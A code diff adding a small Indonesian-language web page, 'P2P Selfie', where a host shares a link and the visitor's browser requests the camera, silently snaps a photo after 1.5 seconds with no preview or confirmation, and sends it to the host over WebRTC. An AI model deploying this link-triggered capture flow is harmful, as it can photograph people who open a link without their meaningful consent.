@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>P2P Selfie</title>
+<style>
+  body { font-family: sans-serif; padding: 20px; }
+  #video { display: none; }
+  img { max-width: 320px; border-radius: 12px; margin-top: 10px; }
+</style>
+</head>
+<body>
+<h1>P2P Selfie</h1>
+<div id="host-section">
+  <button id="create">Buat Link Unik</button>
+  <div id="link"></div>
+  <div id="status"></div>
+  <div id="received"></div>
+</div>
+
+<div id="client-section" style="display:none;">
+  <p>Menunggu foto otomatis...</p>
+  <video id="video" autoplay playsinline width="320" height="240"></video>
+</div>
+
+<script>
+const signalingUrl = 'wss://your-signaling-server.example'; // Ganti dengan signaling servermu
+let pc;
+let dc;
+let isHost = false;
+let roomId;
+
+const createBtn = document.getElementById('create');
+const linkDiv = document.getElementById('link');
+const statusDiv = document.getElementById('status');
+const receivedDiv = document.getElementById('received');
+const video = document.getElementById('video');
+const clientSection = document.getElementById('client-section');
+const hostSection = document.getElementById('host-section');
+
+function randomId(length=8) {
+  return Math.random().toString(36).substr(2, length);
+}
+
+// Simple signaling via WebSocket
+let ws;
+
+function connectSignaling() {
+  ws = new WebSocket(signalingUrl);
+
+  ws.onopen = () => {
+    if (isHost) {
+      ws.send(JSON.stringify({ type: 'join', room: roomId }));
+    } else {
+      ws.send(JSON.stringify({ type: 'join', room: roomId }));
+    }
+    statusDiv.textContent = 'Terhubung ke signaling server...';
+  };
+
+  ws.onmessage = async (msg) => {
+    let data = JSON.parse(msg.data);
+
+    if (!pc) createPeerConnection();
+
+    if (data.type === 'offer' && !isHost) {
+      await pc.setRemoteDescription(new RTCSessionDescription(data.offer));
+      const answer = await pc.createAnswer();
+      await pc.setLocalDescription(answer);
+      ws.send(JSON.stringify({ type: 'answer', answer: answer, room: roomId }));
+      statusDiv.textContent = 'Menjawab offer...';
+    } else if (data.type === 'answer' && isHost) {
+      await pc.setRemoteDescription(new RTCSessionDescription(data.answer));
+      statusDiv.textContent = 'Koneksi WebRTC terbentuk!';
+    } else if (data.type === 'candidate') {
+      try {
+        await pc.addIceCandidate(data.candidate);
+      } catch (e) {
+        console.error(e);
+      }
+    }
+  };
+}
+
+function createPeerConnection() {
+  pc = new RTCPeerConnection();
+
+  pc.onicecandidate = event => {
+    if (event.candidate) {
+      ws.send(JSON.stringify({ type: 'candidate', candidate: event.candidate, room: roomId }));
+    }
+  };
+
+  if (isHost) {
+    dc = pc.createDataChannel('selfie');
+    setupDataChannel();
+    pc.createOffer().then(offer => {
+      pc.setLocalDescription(offer);
+      ws.send(JSON.stringify({ type: 'offer', offer: offer, room: roomId }));
+    });
+  } else {
+    pc.ondatachannel = event => {
+      dc = event.channel;
+      setupDataChannel();
+    };
+  }
+}
+
+function setupDataChannel() {
+  dc.onopen = () => {
+    statusDiv.textContent = 'Data channel terbuka.';
+    if (!isHost) {
+      // Setelah data channel terbuka, ambil foto otomatis dan kirim
+      takePhotoAndSend();
+    }
+  };
+  dc.onmessage = event => {
+    if (isHost) {
+      // Terima foto dari client dan tampilkan
+      const img = new Image();
+      img.src = event.data;
+      receivedDiv.innerHTML = '<h3>Foto dari client:</h3>';
+      receivedDiv.appendChild(img);
+    }
+  };
+}
+
+async function takePhotoAndSend() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    video.srcObject = stream;
+
+    // Tunggu 1.5 detik kamera siap
+    setTimeout(() => {
+      const canvas = document.createElement('canvas');
+      canvas.width = 320;
+      canvas.height = 240;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imgData = canvas.toDataURL('image/png');
+
+      dc.send(imgData);
+      video.srcObject.getTracks().forEach(track => track.stop());
+      statusDiv.textContent = 'Foto sudah dikirim.';
+      clientSection.innerHTML = '<h3>Foto berhasil dikirim ke host!</h3>';
+    }, 1500);
+  } catch (e) {
+    alert('Gagal akses kamera: ' + e.message);
+  }
+}
+
+// Untuk host: buat room dan link
+createBtn.onclick = () => {
+  isHost = true;
+  roomId = randomId(10);
+  const url = window.location.origin + window.location.pathname + '?room=' + roomId;
+  linkDiv.innerHTML = `<p>Bagikan link ini ke pengguna kedua:</p><a href="${url}" target="_blank">${url}</a>`;
+  connectSignaling();
+};
+
+// Untuk client: cek parameter room dan otomatis join
+function getRoomFromUrl() {
+  const params = new URLSearchParams(window.location.search);
+  return params.get('room');
+}
+
+const roomFromUrl = getRoomFromUrl();
+if (roomFromUrl) {
+  isHost = false;
+  roomId = roomFromUrl;
+  hostSection.style.display = 'none';
+  clientSection.style.display = 'block';
+  connectSignaling();
+}
+</script>
+</body>
+</html>
